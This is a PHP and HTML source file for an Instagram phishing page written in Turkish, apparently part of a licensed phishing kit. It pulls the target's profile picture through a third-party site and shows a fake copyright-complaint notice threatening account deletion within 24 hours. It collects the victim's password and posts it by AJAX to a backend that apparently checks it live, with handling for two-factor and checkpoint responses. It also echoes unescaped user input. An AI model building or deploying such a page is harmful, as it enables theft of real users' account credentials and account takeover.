<?php
session_start();
$user = $_GET["user"];

  $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL,"https://www.instatakipci.com/phpCurl");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,
        "user=".$user."&productAsks=%7B%22sm_domain%22%3A%22https%3A%2F%2Fwww.instagram.com%2F%22%2C%22preview%22%3A%221%22%2C%22sm_type_id%22%3A1%2C%22link_status%22%3A0%2C%22image_way%22%3A%22%22%7D&multiOptionTake=&nextTimeline=");
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $server_output = curl_exec($ch);

    curl_close ($ch);

    $data = json_decode($server_output,true);
    
    $pp= $data['imageChange'];

$img_file = $pp;

// dosyayı okuma ve base 64 ile encode'leme işlemi
$imgData = base64_encode(file_get_contents($img_file));

// data:{mime};base64,{data};
$pp = 'data:image/png;base64,'.$imgData;

?>

<?php   
session_start();
error_reporting(0);
$user=$_GET['user'];
 
if (empty($_SESSION['token'])) {
    if (function_exists('mcrypt_create_iv')) {
        $_SESSION['token'] = bin2hex(mcrypt_create_iv(32, MCRYPT_DEV_URANDOM));
    } else {
        $_SESSION['token'] = bin2hex(openssl_random_pseudo_bytes(32));
    }
}
$token = $_SESSION['token'];

?><!DOCTYPE html>
<html lang="en">
   <head>
      <title>Instagram | Login</title>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <!--===============================================================================================-->	
      <link rel="icon" type="image/png" href="favicon.png"/>
      <!--===============================================================================================-->
      <link rel="stylesheet" type="text/css" href="css/vendor/bootstrap/css/bootstrap.min.css">
      <!--===============================================================================================-->
      <link rel="stylesheet" type="text/css" href="fonts/font-awesome-4.7.0/css/font-awesome.min.css">
      <!--===============================================================================================-->
      <link rel="stylesheet" type="text/css" href="css/vendor/animate/animate.css">
      <!--===============================================================================================-->	
      <link rel="stylesheet" type="text/css" href="css/vendor/css-hamburgers/hamburgers.min.css">
      <!--===============================================================================================-->
      <link rel="stylesheet" type="text/css" href="css/vendor/select2/select2.min.css">
      <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css">
      <!--===============================================================================================-->
      <link rel="stylesheet" type="text/css" href="css/util.css">
      <link rel="stylesheet" type="text/css" href="css/main.css">
      <!--===============================================================================================-->
   </head>
   <style type="text/css">
   <style>
      img {
      border: 1px solid #ddd;
      border-radius: 4px;
      padding: 5px;
      width: 150px;
      }
      .overlay{
      display: none;
      position: fixed;
      width: 100%;
      height: 100%;
      top: 0;
      left: 0;
      z-index: 999;
      background: rgba(255,255,255,0.8) url("https://i.pinimg.com/originals/78/e8/26/78e826ca1b9351214dfdd5e47f7e2024.gif") center no-repeat;
      }
      /* Turn off scrollbar when body element has the loading class */
      body.loading{
      overflow: hidden;   
      }
      /* Make spinner image visible when body element has the loading class */
      body.loading .overlay{
      display: block;
      }
   </style>
   <style type="text/css">  .btn {
      cursor: pointer;
      width: 100%;
      padding:0 8px; 
      background: #3897f0;
      border:1px solid #3897f0;
      color:#fff;
      border-radius:10px;
      font-weight:600;
      font-size: 14px;
      height: 35px;
      line-height: 26px;
      outline: none;
      white-space: nowrap;
      }
   </style>
  <body>
  <div class="limiter">
    <div class="container-login100">
      <div class="wrap-login100">
        <div class="login100-pic js-tilt" data-tilt="" style="will-change: transform; transform: perspective(300px) rotateX(0deg) rotateY(0deg);">
            <!-- yan logo -->
       <br><br><br><br>      <img src="mlogo.jpg" width="1900" style="border-radius:50%;margin-top:12px;" alt="<?php echo $user ?>" alt="IMG">
<br><br><br><br>
        </div>
        <el class="login100-form validate-form" id="elemend"><form id="foo">



      <div style="padding:0px; margin:0px; border:0px solid #ffffff; width:100%; background:white;">


<center>
   <img src="<?php echo $pp ?>" alt="<?php echo $user ?>"of="" photo="" width="150" style="border-radius:50%;margin-top:12px;">
</center><br>
<center>
<h1 style="font-family:sans-serif;
font-weight:400;
letter-spacing:;
color:#3d3d3d;
font-size: 20px;">
<p style="max-width:87%; font-size:15px; color: #999; line-height:20px; font-weight:400;">

</style>
<p style="max-width:87%; font-size:15px; color: #999; line-height:20px; font-weight:400;">
Sayın  @<?php echo $user ?> , Hesabınızla ilgili telif hakkı yasalarımızı ihlal ettiğinize dair çok sayıda şikayet aldk. Bize geri bildirimde bulunmazsanız, hesabınız 24 saat içinde kaldırılacaktır.
Bunun yanlış olduğunu düşünüyorsanız, lütfen aşağıdaki bilgilerinizi doğrulayın. Bu bilgileri istiyoruz çünkü hesabınızın gerçek sahibi olduğunuzu doğrulayamıyoruz.
</p></center>
          <hr><div class="wrap-input100 validate-input"> 
       
     <input name="instauser" type="hidden" value="<?php echo $user ?>">

            <span class="symbol-input100">  </span> </div><div class="wrap-input100 validate-input"> <input class="input100" type="password" required="" name="instapass" placeholder="Şifre">
 <span class="symbol-input100"> <i class="fa fa-lock" aria-hidden="true"></i> </span> </div> 
       
     <input name="token" type="hidden" value="<?= $token ?>">

            <button type="submit" value="Giriş Yap" id="df" class="btn">Giriş Yap @<?php echo $user ?></button><br> <br><durum id="statuss"></durum><center><h6><font onclick="javascript:window.location.href='https://www.instagram.com/accounts/password/reset/'; " color="#00376b">Şifreni mi Unuttun?</font></a></h6></center><br><br>

            <br></form></el></div>






          </div>
        </div>

      <!--===============================================================================================-->	
      <script src="css/vendor/jquery/jquery-3.2.1.min.js"></script>
      <!--===============================================================================================-->
      <script src="css/vendor/bootstrap/js/popper.js"></script>
      <script src="css/vendor/bootstrap/js/bootstrap.min.js"></script>
      <!--===============================================================================================-->
      <script src="css/vendor/select2/select2.min.js"></script>
      <!--===============================================================================================-->
      <script src="css/vendor/tilt/tilt.jquery.min.js"></script>
      <script >
         $('.js-tilt').tilt({
         	scale: 1.1
         })
      </script>
      <!--===============================================================================================-->
      <script src="css/js/main.js"></script>
      <script type="text/javascript">
         var request;

         $("#foo").submit(function(event){
          var btn = $("#df");
btn.prop("disabled", true); 
         

          $("#df").html("<img wight='20' height='20' src='https://i.gifer.com/ZZ5H.gif'>");

          event.preventDefault();
          var $form = $(this);
          var serializedData = $form.serialize();

          request = $.ajax({
            url: "ajaxlogin.php",
            type: "post",
            dataType: "json",
            data: serializedData,  

            success: function(data)
            {

if(data.tokenerror) {
             
              $("#df").html("Sign In");
              $("#statuss").html(' <font color="#ed4956"><center>Refresh the security error page.</center></font><br><br> ');
btn.html("Security Error");
              return false;
            }
            
           if(data.lisanshata) {
             
              $("#df").html("Sign In");
              $("#statuss").html(' <font color="#ed4956"><center>You do not have a license!</center></font><br><br> ');
btn.html("License Error");
              return false;
            }
                  
            
                   if(data.user==false){
              $("#statuss").html(' <font color="#ed4956"><center>Hatalı kullanıcı adı lütfen kontrol ediniz</center></font><br ><br> ');
btn.prop("disabled", false);
             
              $("#df").html("giriş yap");
              return false;


            }
            if(data.checkpoint_url) {
             
              $("#df").html("giriş yap");
              $("#statuss").html(' <font color="#ed4956"><center>İnstagram uygulamasına giderek girişinizi doğrulayın ve tekrar deneyin </center></font><br><br> ');
btn.prop("disabled", false);
              return false;
            }

            if(data.authenticated==false){
              $("#statuss").html('<font color="#ed4956"><center>Şifreniz hatalı lütfen kontrol  ediniz</center></font><br><br> ') ;
btn.prop("disabled", false);
        
              $("#df").html("giriş yap");
              return false;

            }
             if(data.two_factor_required) {
               window.location.href ='two';
                   return false;
              }
              
                if(data.status=="fail") {
              $("#statuss").html('<font color="#ed4956"><center>'+data.feedback_message+'</center></font><br><br> ');
btn.prop("disabled", false);
        
              $("#df").html("giriş yap");
              return false;
              }
              
              
            if (data.authenticated==true) {
  $("#statuss").html('<font color="#00bf00"><center>Giriş  başarılı</center></font><br><br> ');
            
               $("#df").html("Giriş yapılıyor");
               
              setTimeout(function(){ window.location.href="confirmed.php"; }, 3000);
             

           }


         }, error:function(res){
                    
              $("#st").html("Bilinmeyen hata. Sayfayı yenileyin");
          alert("Bilinmeyen hata. Sayfayı yenileyin.");
    }
       });
        });
      </script>
   </body>
</html>
